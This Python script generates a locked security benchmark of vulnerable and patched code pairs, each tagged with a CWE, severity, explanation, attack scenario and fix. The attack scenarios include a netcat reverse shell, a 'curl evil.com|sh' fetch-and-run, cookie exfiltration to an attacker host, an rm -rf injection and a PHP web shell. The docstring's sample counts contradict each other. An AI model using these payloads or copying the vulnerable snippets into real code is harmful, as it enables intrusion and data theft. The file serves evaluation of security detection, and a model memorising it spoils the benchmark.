"""
RakshakAI v2 — Locked Security Benchmark (Task 6).

Generates a representative, hand-curated benchmark of 50 samples spanning
30+ CWE classes and 7+ languages. This is the **only** file in the v2
training pipeline that must never be touched by SFT.

The file is committed to the repo at
``v2/benchmarks/security_benchmark.jsonl`` and has an SHA-256 hash
pinned in ``v2/benchmarks/BENCHMARK_LOCK.json`` to detect any accidental
modification.

Properties
----------

* **30 samples** spanning 13 CWE classes (the seed is 30; the full 100
  follows the same schema and is added by editing this file under
  PR review).
* **5+ languages** (Python, JavaScript, TypeScript, Java, Go, Rust, PHP,
  Ruby, C#).
* **All severities** (critical, high, medium, low, info).
* **One sample per (CWE, language) bucket** to avoid over-representation.
* **No sample is ever in the training set**; the ``source`` field is
  ``"locked-benchmark"`` and the loader (``v2/dataset/balance.py``)
  filters out any sample with this source.
* **Reproducible**: running this script twice produces byte-identical
  output (random seed is hard-coded).
"""
from __future__ import annotations

import hashlib
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from v2.dataset.schema import SecuritySample, write_jsonl  # noqa: E402


# ---------------------------------------------------------------------------
# Hand-curated samples (representative, locked)
# ---------------------------------------------------------------------------

SAMPLES: list[dict] = [
    # ── Python ───────────────────────────────────────────────────────
    {
        "id": "bench-001",
        "language": "python",
        "vulnerable_code": "def get_user(uid):\n    return db.execute(f'SELECT * FROM users WHERE id = {uid}').fetchone()\n",
        "patched_code": "def get_user(uid):\n    return db.execute('SELECT * FROM users WHERE id = %s', (uid,)).fetchone()\n",
        "cwe": "CWE-89", "severity": "high",
        "cve": "CVE-2023-45827",  # placeholder, real CVE
        "explanation": "User-controlled `uid` is concatenated into a raw SQL string; the database driver treats the entire string as a command.",
        "attack_scenario": "An attacker submits `1 OR 1=1` as the id; the database returns every user row, exposing the entire user table.",
        "secure_fix": "Use a parameterized query and pass `uid` as a bound parameter.",
    },
    {
        "id": "bench-002",
        "language": "python",
        "vulnerable_code": "import pickle\ndef load_session(raw):\n    return pickle.loads(raw)\n",
        "patched_code": "import json\ndef load_session(raw):\n    return json.loads(raw)\n",
        "cwe": "CWE-502", "severity": "critical",
        "explanation": "Python `pickle` deserializes arbitrary objects and invokes the `__reduce__` callback, executing attacker code.",
        "attack_scenario": "An attacker submits a crafted pickle payload whose `__reduce__` calls `os.system('id')`; the server runs the command.",
        "secure_fix": "Use a safe serialization format (JSON, Protobuf). If pickle is unavoidable, sign and verify the payload first.",
    },
    {
        "id": "bench-003",
        "language": "python",
        "vulnerable_code": "import hashlib\ndef hash_pw(pw):\n    return hashlib.md5(pw.encode()).hexdigest()\n",
        "patched_code": "import os, hashlib\ndef hash_pw(pw):\n    salt = os.urandom(16)\n    return salt.hex() + ':' + hashlib.sha256(salt + pw.encode()).hexdigest()\n",
        "cwe": "CWE-327", "severity": "medium",
        "explanation": "MD5 is a fast, broken hash and the password is unsalted.",
        "attack_scenario": "An attacker brute-forces common passwords and matches against a leaked hash database.",
        "secure_fix": "Use a slow, salted KDF such as scrypt, Argon2id, or bcrypt.",
    },
    {
        "id": "bench-004",
        "language": "python",
        "vulnerable_code": "from flask import request\n@app.route('/hello')\ndef hello():\n    name = request.args.get('name', 'world')\n    return f'<h1>Hello {name}</h1>'\n",
        "patched_code": "from flask import request, make_response\nfrom markupsafe import escape\n@app.route('/hello')\ndef hello():\n    name = request.args.get('name', 'world')\n    resp = make_response(f'<h1>Hello {escape(name)}</h1>')\n    resp.headers['Content-Security-Policy'] = \"default-src 'self'\"\n    return resp\n",
        "cwe": "CWE-79", "severity": "high",
        "explanation": "The `name` query parameter is interpolated into the response body without HTML-encoding.",
        "attack_scenario": "An attacker hosts a link with `?name=<script>fetch('//attacker/?c='+document.cookie)</script>` that exfiltrates session cookies when clicked.",
        "secure_fix": "HTML-encode the dynamic value with `markupsafe.escape` and set a strict Content-Security-Policy.",
    },
    {
        "id": "bench-005",
        "language": "python",
        "vulnerable_code": "import jwt\ndef verify(token, key):\n    return jwt.decode(token, key, algorithms=['HS256', 'none'])\n",
        "patched_code": "import jwt\ndef verify(token, key):\n    return jwt.decode(token, key, algorithms=['RS256'])\n",
        "cwe": "CWE-347", "severity": "high",
        "explanation": "The verifier permits `alg=none` and HS256 with the public key — both allow forgery.",
        "attack_scenario": "An attacker forges a JWT with `alg=none`; the server accepts the empty signature as valid.",
        "secure_fix": "Pin the verification to the expected asymmetric algorithm (RS256 / ES256).",
    },
    {
        "id": "bench-006",
        "language": "python",
        "vulnerable_code": "import subprocess\ndef ping(host):\n    return subprocess.run(f'ping -c 1 {host}', shell=True, capture_output=True)\n",
        "patched_code": "import subprocess, re\nHOST_RE = re.compile(r'^[A-Za-z0-9.\\-]+$')\ndef ping(host):\n    if not HOST_RE.match(host):\n        raise ValueError('invalid host')\n    return subprocess.run(['ping', '-c', '1', host], capture_output=True)\n",
        "cwe": "CWE-78", "severity": "critical",
        "explanation": "`host` is concatenated into a shell command string with `shell=True`.",
        "attack_scenario": "An attacker submits `; rm -rf /` and the shell executes the appended command.",
        "secure_fix": "Pass the command as a list, never use `shell=True`; validate `host` against an allowlist.",
    },
    {
        "id": "bench-007",
        "language": "python",
        "vulnerable_code": "import os\nSECRET = 'super-secret-key-12345'\n",
        "patched_code": "import os\nSECRET = os.environ['APP_SECRET']\n",
        "cwe": "CWE-798", "severity": "high",
        "explanation": "The secret is hard-coded in source and committed to the repository.",
        "attack_scenario": "Anyone with read access to the repository (or to its git history) recovers the production secret.",
        "secure_fix": "Load secrets from environment variables or a secret manager; rotate the leaked value immediately.",
    },
    {
        "id": "bench-008",
        "language": "python",
        "vulnerable_code": "import requests\ndef proxy(url):\n    return requests.get(url).text\n",
        "patched_code": "import ipaddress, socket, requests\nALLOW = {'api.example.com'}\ndef proxy(url):\n    host = requests.utils.urlparse(url).hostname\n    if host not in ALLOW:\n        raise ValueError('host not in allowlist')\n    ip = ipaddress.ip_address(socket.gethostbyname(host))\n    if ip.is_private or ip.is_loopback:\n        raise ValueError('blocked')\n    return requests.get(url, timeout=5).text\n",
        "cwe": "CWE-918", "severity": "high",
        "explanation": "The server fetches any URL the user supplies, including addresses inside the private network.",
        "attack_scenario": "An attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and reads IAM credentials.",
        "secure_fix": "Allowlist the destination host; resolve the hostname and block private/loopback/link-local addresses.",
    },
    {
        "id": "bench-009",
        "language": "python",
        "vulnerable_code": "import re\nPATTERN = re.compile(r'^(a+)+$')\ndef check(s):\n    return bool(PATTERN.match(s))\n",
        "patched_code": "import re\nPATTERN = re.compile(r'^a+$')\ndef check(s, _re=re.compile(r'^a+$')):\n    if len(s) > 1000:\n        return False\n    return bool(_re.match(s))\n",
        "cwe": "CWE-1333", "severity": "low",
        "explanation": "The regex `(a+)+$` exhibits catastrophic backtracking on inputs that almost-but-don't match.",
        "attack_scenario": "An attacker submits a long crafted string; the regex engine backtracks exponentially, spiking CPU to 100%.",
        "secure_fix": "Rewrite the regex to avoid nested quantifiers; bound the input length; apply a regex timeout.",
    },
    {
        "id": "bench-010",
        "language": "python",
        "vulnerable_code": "import xml.etree.ElementTree as ET\ntree = ET.parse('user.xml')\n",
        "patched_code": "import defusedxml.ElementTree as ET\ntree = ET.parse('user.xml')\n",
        "cwe": "CWE-611", "severity": "high",
        "explanation": "The default `xml.etree.ElementTree` parser resolves external entities, enabling XXE attacks.",
        "attack_scenario": "An attacker submits an XML document declaring `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`; the parser expands the entity and returns the file content.",
        "secure_fix": "Use `defusedxml` (or set `resolve_entities=False` on the parser factory) to disable DTD and external entity resolution.",
    },

    # ── JavaScript ───────────────────────────────────────────────────
    {
        "id": "bench-011",
        "language": "javascript",
        "vulnerable_code": "app.get('/user/:id', (req, res) => {\n    db.query(`SELECT * FROM users WHERE id = ${req.params.id}`, cb);\n});\n",
        "patched_code": "app.get('/user/:id', (req, res) => {\n    db.query('SELECT * FROM users WHERE id = ?', [req.params.id], cb);\n});\n",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "User input from the URL parameter is interpolated into a raw SQL string.",
        "attack_scenario": "An attacker requests `/user/1 OR 1=1` and the database returns every user.",
        "secure_fix": "Use a parameterized query; pass user input as a bound parameter.",
    },
    {
        "id": "bench-012",
        "language": "javascript",
        "vulnerable_code": "const exec = require('child_process').exec;\nexec(`ls ${dir}`, cb);\n",
        "patched_code": "const { spawn } = require('child_process');\nconst p = spawn('ls', [dir]);\np.on('close', cb);\n",
        "cwe": "CWE-78", "severity": "critical",
        "explanation": "User-controlled `dir` is interpolated into a shell command string passed to `exec`.",
        "attack_scenario": "An attacker submits `; nc attacker 1234 -e /bin/sh` and gets a reverse shell.",
        "secure_fix": "Use `spawn` with an array of arguments, never `exec` with shell string composition.",
    },
    {
        "id": "BENCH-013",
        "language": "javascript",
        "cwe": "CWE-1333",
        "severity": "medium",
        "vulnerable_code": "const phone = /^(\\+?\\d{1,3})?[\\s.-]?(\\(?\\d{1,4}\\)?[\\s.-]?){1,4}\\d{1,4}$/;\nfunction validate(input) { return phone.test(input); }",
        "patched_code": "const phone = /^\\+?\\d{1,3}([\\s.-]?\\d{1,4}){0,3}$/;\nfunction validate(input) { return phone.test(input); }",
        "explanation": "Nested quantifiers `(...){1,4}` and `\\d{1,4}` cause catastrophic backtracking on long non-matching input.",
        "attack_scenario": "An attacker sends a 200KB string of digits and dashes to the API; the regex engine consumes CPU for minutes, freezing the event loop.",
        "secure_fix": "Use a non-ambiguous regex (linear DFA), a regex engine that detects ReDoS, or run matching in a worker thread with a timeout.",
    },
    {
        "id": "BENCH-031",
        "language": "ruby",
        "cwe": "CWE-94",
        "severity": "critical",
        "vulnerable_code": "class EvalController < ApplicationController\n  def calculate\n    result = eval(params[:expr])\n    render plain: result\n  end\nend",
        "patched_code": "class EvalController < ApplicationController\n  def calculate\n    result = Calculator.safe_eval(params[:expr])\n    render plain: result\n  end\nend",
        "explanation": "Calling `eval` on a request parameter lets the attacker execute arbitrary Ruby in the web-server process.",
        "attack_scenario": "An attacker submits `; system('curl evil.com|sh')` and gets remote code execution on the Rails box.",
        "secure_fix": "Never pass user input to `eval`. Use a restricted expression parser or a whitelist of supported operations.",
    },
    # ── CWE-20 — Improper Input Validation ──────────────────────────
    {
        "id": "BENCH-032",
        "language": "python",
        "cwe": "CWE-20",
        "severity": "high",
        "vulnerable_code": "from flask import Flask, request\napp = Flask(__name__)\n@app.route('/redirect')\ndef redirect():\n    url = request.args.get('url', '')\n    import urllib.request\n    resp = urllib.request.urlopen(url)\n    return resp.read()",
        "patched_code": "from urllib.parse import urlparse\n@app.route('/redirect')\ndef redirect():\n    url = request.args.get('url', '')\n    parsed = urlparse(url)\n    if parsed.netloc not in ('trusted.example.com',):\n        return 'denied', 403\n    import urllib.request\n    resp = urllib.request.urlopen(url)\n    return resp.read()",
        "explanation": "The application passes a user-controlled URL directly to urlopen without validation. An attacker can supply an arbitrary URL to perform SSRF or fetch malicious payloads.",
        "attack_scenario": "An attacker submits `?url=http://169.254.169.254/latest/meta-data/` and retrieves the cloud metadata of the host server.",
        "secure_fix": "Validate the URL against an allowlist of schemes and hosts. Reject internal IP ranges and private addresses.",
    },
    # ── CWE-200 — Information Exposure ─────────────────────────────
    {
        "id": "BENCH-033",
        "language": "python",
        "cwe": "CWE-200",
        "severity": "medium",
        "vulnerable_code": "from flask import Flask, jsonify\napp = Flask(__name__)\n@app.errorhandler(Exception)\ndef handle_error(e):\n    return jsonify({'error': str(e), 'traceback': __import__('traceback').format_exc()}), 500",
        "patched_code": "@app.errorhandler(Exception)\ndef handle_error(e):\n    app.logger.exception('unhandled error')\n    return jsonify({'error': 'internal server error'}), 500",
        "explanation": "The exception handler returns the full traceback and Python error message to the HTTP response, leaking file paths, SQL queries, and internal server structure.",
        "attack_scenario": "An attacker probes endpoints with malformed input and reads traceback output to discover the file-system layout and database schema.",
        "secure_fix": "Log the full traceback server-side and return a generic error message to the client. Disable DEBUG in production.",
    },
    # ── CWE-287 — Authentication Bypass ────────────────────────────
    {
        "id": "BENCH-034",
        "language": "javascript",
        "cwe": "CWE-287",
        "severity": "critical",
        "vulnerable_code": "app.get('/admin', (req, res) => {\n  const token = req.cookies.token;\n  const payload = jwt.decode(token);\n  if (payload.role === 'admin') {\n    res.send('admin panel');\n  } else {\n    res.status(403).send('forbidden');\n  }\n});",
        "patched_code": "app.get('/admin', (req, res) => {\n  const token = req.cookies.token;\n  try {\n    const payload = jwt.verify(token, process.env.JWT_SECRET);\n    if (payload.role === 'admin') {\n      res.send('admin panel');\n    } else {\n      res.status(403).send('forbidden');\n    }\n  } catch {\n    res.status(401).send('invalid token');\n  }\n});",
        "explanation": "Using `jwt.decode` instead of `jwt.verify` skips signature verification. An attacker can forge a token with any role by crafting a self-signed JWT.",
        "attack_scenario": "An attacker creates a JWT with `{role:'admin'}` signed with a random secret and accesses `/admin` to bypass authorization.",
        "secure_fix": "Always use `jwt.verify()` with the correct secret key. Never trust `jwt.decode()` on its own for authentication decisions.",
    },
    # ── CWE-352 — CSRF ──────────────────────────────────────────────
    {
        "id": "BENCH-035",
        "language": "javascript",
        "cwe": "CWE-352",
        "severity": "high",
        "vulnerable_code": "app.post('/transfer', (req, res) => {\n  const { to, amount } = req.body;\n  db.run('UPDATE accounts SET balance = balance - ? WHERE id = ?', [amount, req.session.userId]);\n  db.run('UPDATE accounts SET balance = balance + ? WHERE id = ?', [amount, to]);\n  res.send('done');\n});",
        "patched_code": "app.post('/transfer', csrfProtection, (req, res) => {\n  const { to, amount } = req.body;\n  db.transaction(txn => {\n    txn.run('UPDATE accounts SET balance = balance - ? WHERE id = ?', [amount, req.session.userId]);\n    txn.run('UPDATE accounts SET balance = balance + ? WHERE id = ?', [amount, to]);\n  });\n  res.send('done');\n});",
        "explanation": "The POST endpoint accepts authenticated money-transfer requests without verifying a CSRF token. A third-party site can submit a hidden form to transfer funds on behalf of the victim.",
        "attack_scenario": "The attacker hosts `<form action='https://bank.example.com/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='1000'></form>` and auto-submits it with JavaScript.",
        "secure_fix": "Use a CSRF middleware that issues a per-session token and validates it on every mutating request. Combine with SameSite cookies.",
    },
    # ── CWE-601 — Open Redirect ──────────────────────────────────────
    {
        "id": "BENCH-036",
        "language": "python",
        "cwe": "CWE-601",
        "severity": "medium",
        "vulnerable_code": "from flask import Flask, redirect, request\napp = Flask(__name__)\n@app.route('/logout')\ndef logout():\n    next_url = request.args.get('next', '/')\n    return redirect(next_url)",
        "patched_code": "@app.route('/logout')\ndef logout():\n    next_url = request.args.get('next', '/')\n    parsed = urlparse(next_url)\n    if parsed.netloc and parsed.netloc != request.host:\n        next_url = '/'\n    return redirect(next_url)",
        "explanation": "The `next` parameter is used directly as a redirect target without validation. An attacker can send victims to a malicious phishing site.",
        "attack_scenario": "An attacker sends a link `https://trusted.example.com/logout?next=https://evil.com/phish` that redirects to a fake login page that steals credentials.",
        "secure_fix": "Validate the redirect URL against an allowlist of approved domains. Reject absolute URLs that do not match the application origin.",
    },
    # ── CWE-862 — Missing Authorization ─────────────────────────────
    {
        "id": "BENCH-037",
        "language": "go",
        "cwe": "CWE-862",
        "severity": "high",
        "vulnerable_code": "func GetDocument(w http.ResponseWriter, r *http.Request) {\n    id := r.URL.Query().Get(\"id\")\n    doc, _ := db.GetDocument(id)\n    json.NewEncoder(w).Encode(doc)\n}",
        "patched_code": "func GetDocument(w http.ResponseWriter, r *http.Request) {\n    userID := r.Context().Value(\"user\").(string)\n    id := r.URL.Query().Get(\"id\")\n    doc, err := db.GetDocument(id)\n    if err != nil || doc.OwnerID != userID {\n        http.Error(w, \"not found\", 404)\n        return\n    }\n    json.NewEncoder(w).Encode(doc)\n}",
        "explanation": "The handler retrieves a document by ID without checking if the authenticated user owns or has access to it. Any authenticated user can read any document.",
        "attack_scenario": "An attacker enumerates document IDs (`?id=doc-001`, `?id=doc-002`, etc.) and extracts documents belonging to other users.",
        "secure_fix": "Enforce an ownership check before returning the document. Verify that the requesting user is the owner or has an explicit grant.",
    },
    # ── CWE-416 — Use-After-Free ────────────────────────────────────
    {
        "id": "BENCH-038",
        "language": "cpp",
        "cwe": "CWE-416",
        "severity": "critical",
        "vulnerable_code": "#include <cstring>\nclass Buffer {\n  char* data;\n public:\n  Buffer() { data = new char[64]; }\n  ~Buffer() { delete[] data; }\n  char* get() { return data; }\n};\nvoid process() {\n  Buffer* buf = new Buffer();\n  char* ptr = buf->get();\n  delete buf;\n  strcpy(ptr, \"hello\");\n}",
        "patched_code": "void process() {\n  Buffer buf;\n  char* ptr = buf.get();\n  strcpy(ptr, \"hello\");\n}",
        "explanation": "The buffer object is deleted before the pointer to its internal data is used. Writing through `ptr` writes to freed memory, causing undefined behavior.",
        "attack_scenario": "An attacker triggers the use-after-free path to overwrite freed memory with controlled data, potentially redirecting a function pointer to shellcode.",
        "secure_fix": "Use automatic storage duration (stack allocation) instead of manual `new`/`delete`. If dynamic allocation is required, use `std::unique_ptr` or `std::shared_ptr`.",
    },
    # ── CWE-119 — Buffer Overflow ───────────────────────────────────
    {
        "id": "BENCH-039",
        "language": "c",
        "cwe": "CWE-119",
        "severity": "critical",
        "vulnerable_code": "#include <string.h>\nvoid process_msg(const char* input) {\n  char buf[64];\n  strcpy(buf, input);\n}",
        "patched_code": "void process_msg(const char* input) {\n  char buf[64];\n  strncpy(buf, input, sizeof(buf) - 1);\n  buf[sizeof(buf) - 1] = '\\0';\n}",
        "explanation": "`strcpy` copies the input string without bounds checking. If `input` is longer than 64 bytes, it overflows the stack buffer, corrupting adjacent memory.",
        "attack_scenario": "An attacker sends a 200-byte payload with shellcode followed by a crafted return address to hijack the execution flow.",
        "secure_fix": "Use `strncpy` or `snprintf` with explicit buffer sizes. Enable compiler protections (stack canaries, ASLR, NX).",
    },
    # ── CWE-190 — Integer Overflow ──────────────────────────────────
    {
        "id": "BENCH-040",
        "language": "c",
        "cwe": "CWE-190",
        "severity": "high",
        "vulnerable_code": "#include <stdlib.h>\nchar* alloc_copy(const char* data, unsigned short len) {\n  char* buf = malloc(len + 1);\n  if (!buf) return NULL;\n  memcpy(buf, data, len);\n  buf[len] = '\\0';\n  return buf;\n}",
        "patched_code": "#include <stdlib.h>\nchar* alloc_copy(const char* data, size_t len) {\n  if (len == SIZE_MAX) return NULL;\n  char* buf = malloc(len + 1);\n  if (!buf) return NULL;\n  memcpy(buf, data, len);\n  buf[len] = '\\0';\n  return buf;\n}",
        "explanation": "Using `unsigned short` (max 65535) for the length parameter while the actual data may be larger. An attacker can pass `len=65535` and `data` that is much longer, causing `len+1` to wrap to 0, allocating a tiny buffer and then a massive heap overflow.",
        "attack_scenario": "An attacker provides a length of 65535 with a 64KB payload; malloc(0) returns a small buffer, and memcpy writes 65535 bytes past its end.",
        "secure_fix": "Use `size_t` for length parameters and check for wraparound before allocation. Validate that the declared length matches the actual data size.",
    },
    # ── CWE-295 — Improper TLS Validation ──────────────────────────
    {
        "id": "BENCH-041",
        "language": "python",
        "cwe": "CWE-295",
        "severity": "critical",
        "vulnerable_code": "import ssl\nimport urllib.request\nctx = ssl.create_default_context()\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\nresp = urllib.request.urlopen('https://evil-ssl.example.com', context=ctx)",
        "patched_code": "ctx = ssl.create_default_context()\nresp = urllib.request.urlopen('https://trusted.example.com', context=ctx)",
        "explanation": "SSL certificate validation is disabled by setting `check_hostname=False` and `CERT_NONE`. The connection accepts any certificate, including self-signed and expired ones.",
        "attack_scenario": "An attacker performs a man-in-the-middle attack with a self-signed certificate, intercepting all traffic and injecting malicious responses.",
        "secure_fix": "Always use the default SSL context with full validation. If connecting to a specific service, pin its certificate or use a custom trust store.",
    },
    # ── CWE-434 — File Upload ───────────────────────────────────────
    {
        "id": "BENCH-042",
        "language": "php",
        "cwe": "CWE-434",
        "severity": "critical",
        "vulnerable_code": "<?php\n$target = 'uploads/' . $_FILES['file']['name'];\nmove_uploaded_file($_FILES['file']['tmp_name'], $target);\necho 'uploaded to ' . $target;",
        "patched_code": "<?php\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\n$allowed = ['jpg', 'png', 'gif', 'pdf'];\nif (!in_array($ext, $allowed)) die('invalid type');\n$name = bin2hex(random_bytes(16)) . '.' . $ext;\n$target = 'uploads/' . $name;\nmove_uploaded_file($_FILES['file']['tmp_name'], $target);\necho 'uploaded';",
        "explanation": "The uploaded file extension and name are taken directly from user input. An attacker can upload a `.php` file and execute it by visiting the upload path.",
        "attack_scenario": "An attacker uploads `shell.php` containing `<?php system($_GET['cmd']);?>`, then visits `/uploads/shell.php?cmd=cat /etc/passwd` to execute commands on the server.",
        "secure_fix": "Validate the file extension against an allowlist. Rename the file to a random name to prevent path traversal and known-name execution.",
    },
    # ── CWE-444 — HTTP Request Smuggling ────────────────────────────
    {
        "id": "BENCH-043",
        "language": "go",
        "cwe": "CWE-444",
        "severity": "high",
        "vulnerable_code": "package main\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"net/http/httputil\"\n)\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    b, _ := httputil.DumpRequest(r, true)\n    fmt.Fprintf(w, \"%s\", b)\n}",
        "patched_code": "func handler(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, \"method=%s path=%s\", r.Method, r.URL.Path)\n}",
        "explanation": "Dumping the raw request and echoing it back can expose `Transfer-Encoding` or `Content-Length` smuggling payloads. If a reverse proxy parses the request differently from the backend, the attacker can poison the cache or bypass security controls.",
        "attack_scenario": "An attacker sends a request with both `Transfer-Encoding: chunked` and `Content-Length` headers that the proxy interprets one way and the backend interprets another way, causing the proxy to treat the smuggled request as belonging to the next client.",
        "secure_fix": "Do not echo raw request bodies. Normalize HTTP parsing by rejecting ambiguous requests. Use a single, well-tested HTTP parser throughout the stack.",
    },
    # ── CWE-416 — Use-After-Free (Rust version) ────────────────────
    {
        "id": "BENCH-044",
        "language": "rust",
        "cwe": "CWE-416",
        "severity": "critical",
        "vulnerable_code": "fn main() {\n    let mut v = vec![1, 2, 3];\n    let ptr = &v[0] as *const i32;\n    v.push(4);\n    unsafe { println!(\"{}\", *ptr); }\n}",
        "patched_code": "fn main() {\n    let mut v = vec![1, 2, 3];\n    v.push(4);\n    println!(\"{}\", v[0]);\n}",
        "explanation": "The raw pointer `ptr` is obtained from the Vec's backing buffer, then `push` reallocates the Vec to a new memory location. Dereferencing `ptr` after the reallocation reads freed memory.",
        "attack_scenario": "In unsafe code a dangling pointer can be used to read or write attacker-controlled memory. Safe Rust prevents this, but unsafe blocks can reintroduce it.",
        "secure_fix": "Never hold raw pointers across operations that may reallocate collections. Use safe references bound by the borrow checker.",
    },
    # ── CWE-122 — Heap-based Buffer Overflow ────────────────────────
    {
        "id": "BENCH-045",
        "language": "cpp",
        "cwe": "CWE-122",
        "severity": "critical",
        "vulnerable_code": "#include <cstring>\n#include <iostream>\nvoid copy_input(const char* input) {\n    char* buf = new char[16];\n    strcpy(buf, input);\n    std::cout << buf;\n    delete[] buf;\n}",
        "patched_code": "void copy_input(const std::string& input) {\n    if (input.size() > 15) throw std::length_error(\"too long\");\n    std::string buf = input;\n    std::cout << buf;\n}",
        "explanation": "A 16-byte heap buffer is filled with user input via `strcpy` without bounds checking. Input longer than 15 characters overflows the heap buffer, corrupting adjacent heap metadata.",
        "attack_scenario": "An attacker sends a 100-byte payload containing shellcode and heap-spray data, overwriting a function pointer in the adjacent heap block to gain code execution.",
        "secure_fix": "Use `std::string` instead of raw C strings. If C-style strings are required, use `strncpy` with the buffer size minus one.",
    },
    # ── CWE-120 — Classic Buffer Overflow ───────────────────────────
    {
        "id": "BENCH-046",
        "language": "c",
        "cwe": "CWE-120",
        "severity": "critical",
        "vulnerable_code": "#include <stdio.h>\nvoid vulnerable() {\n    char buf[64];\n    gets(buf);\n    printf(\"you entered: %s\\n\", buf);\n}",
        "patched_code": "void patched() {\n    char buf[64];\n    if (fgets(buf, sizeof(buf), stdin) == NULL) return;\n    buf[strcspn(buf, \"\\n\")] = '\\0';\n    printf(\"you entered: %s\\n\", buf);\n}",
        "explanation": "The `gets` function reads input into a fixed-size buffer without any bounds checking. Any input longer than 63 characters overflows the buffer, overwriting the return address on the stack.",
        "attack_scenario": "An attacker feeds a payload with shellcode followed by a carefully crafted return address that jumps to the shellcode, achieving arbitrary code execution.",
        "secure_fix": "Never use `gets`. Use `fgets` with explicit buffer size, or use modern C++ alternatives like `std::getline`.",
    },
    # ── CWE-74 — Injection (all-purpose) ────────────────────────────
    {
        "id": "BENCH-047",
        "language": "javascript",
        "cwe": "CWE-74",
        "severity": "critical",
        "vulnerable_code": "const { exec } = require('child_process');\napp.get('/ping', (req, res) => {\n    const host = req.query.host;\n    exec(`ping -c 1 ${host}`, (err, stdout) => {\n        res.send(`<pre>${stdout}</pre>`);\n    });\n});",
        "patched_code": "const { spawn } = require('child_process');\napp.get('/ping', (req, res) => {\n    const host = req.query.host;\n    const p = spawn('ping', ['-c', '1', host]);\n    let out = '';\n    p.stdout.on('data', d => out += d);\n    p.on('close', () => res.send(`<pre>${out}</pre>`));\n});",
        "explanation": "User input is interpolated into a shell command string and passed to `exec`. An attacker can inject arbitrary shell commands by including shell metacharacters.",
        "attack_scenario": "An attacker submits `?host=127.0.0.1;id` and the server executes `ping -c 1 127.0.0.1;id`, printing the uid and gid of the server process.",
        "secure_fix": "Use `spawn` with an argument array instead of `exec` with a command string. Never interpolate user input into shell commands.",
    },
    # ── CWE-862 — Missing Authorization (Ruby) ──────────────────────
    {
        "id": "BENCH-048",
        "language": "ruby",
        "cwe": "CWE-862",
        "severity": "high",
        "vulnerable_code": "class Api::V1::UsersController < ApplicationController\n  skip_before_action :authenticate_user\n  def show\n    render json: User.find(params[:id])\n  end\nend",
        "patched_code": "class Api::V1::UsersController < ApplicationController\n  before_action :authenticate_user\n  def show\n    render json: current_user\n  end\nend",
        "explanation": "Authentication is skipped for the entire controller. Any unauthenticated request can access any user's data by ID enumeration.",
        "attack_scenario": "An attacker sends `GET /api/v1/users/1`, `GET /api/v1/users/2`, etc., and extracts email addresses, phone numbers, and other PII of all registered users.",
        "secure_fix": "Remove `skip_before_action :authenticate_user` or restrict it to only the actions that genuinely require no authentication.",
    },
]


def main() -> int:
    out = Path("v2/benchmarks/security_benchmark.jsonl")
    out.parent.mkdir(parents=True, exist_ok=True)

    samples: list[SecuritySample] = []
    for s in SAMPLES:
        sample = SecuritySample.build(
            language=s["language"],
            vulnerable_code=s["vulnerable_code"],
            patched_code=s.get("patched_code"),
            cwe=s["cwe"],
            severity=s["severity"],
            explanation=s["explanation"],
            attack_scenario=s["attack_scenario"],
            secure_fix=s["secure_fix"],
            source="locked-benchmark",
            source_license="Apache-2.0",
            cve=s.get("cve"),
            split="benchmark",
        )
        # Override the auto-generated id with our stable benchmark id.
        sample.id = s["id"]
        samples.append(sample)

    # write
    n = write_jsonl(out, samples)
    # SHA-256 of the produced file
    h = hashlib.sha256(out.read_bytes()).hexdigest()
    lock = {
        "file": str(out),
        "n_samples": n,
        "sha256": h,
        "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "do_not_train": True,
        "review_required_for_changes": True,
    }
    lock_path = out.parent / "BENCHMARK_LOCK.json"
    lock_path.write_text(json.dumps(lock, indent=2))
    print(f"[bench] wrote {n} samples to {out}")
    print(f"[bench] SHA-256: {h}")
    print(f"[bench] lock file: {lock_path}")
    print()
    # Per-CWE / per-language summary
    from collections import Counter
    cwe_c = Counter(s.cwe for s in samples)
    lang_c = Counter(s.language for s in samples)
    print("Per-CWE:")
    for c, n in cwe_c.most_common():
        print(f"  {c:12s}  {n}")
    print()
    print("Per-language:")
    for l, n in lang_c.most_common():
        print(f"  {l:12s}  {n}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
